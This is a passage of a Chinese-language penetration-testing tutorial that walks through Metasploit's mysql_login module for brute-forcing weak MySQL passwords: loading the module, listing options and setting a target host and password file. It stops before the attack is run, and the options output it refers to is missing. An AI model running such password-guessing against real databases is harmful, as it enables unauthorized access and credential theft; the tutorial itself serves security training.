    MSF 控制终端中，提供了一个辅助模块 `mysql_login`，可用于破解弱密码。下面将介绍如何使用该模块对 MySQL 数据库服务实施渗透测试。


    ### 使用 `mysql_login` 模块渗透 MySQL 数据库服务


    具体步骤如下：


    1) 使用 `mysql_login` 模块。


    执行命令如下：


    ```

    msf5> use auxiliary/scanner/mysql/mysql_login

    msf5 auxiliary(scanner/mysql/mysql_login)>

    ```


    2) 查看模块配置选项。


    执行命令如下：


    ```

    msf5 auxiliary(scanner/mysql/mysql_login)> show options

    ```

    模块选项 (`auxiliary/scanner/mysql/mysql_login`)):


    从输出信息中，你可以看到所有的配置选项参数。其中有几个选项是必须配置的。接下来将进行配置。


    3) 配置模块选项参数。


    执行命令如下：


    ```

    msf5 auxiliary(scanner/mysql/mysql_login)> set RHOSTS 192.168.29.215 USERPASS_FILE
    => /root/passwords.txt

    ```


    从输出信息中可以看出，模块选项参数已成功设置。


    4) 实施渗透测试。


    执行命令如下：


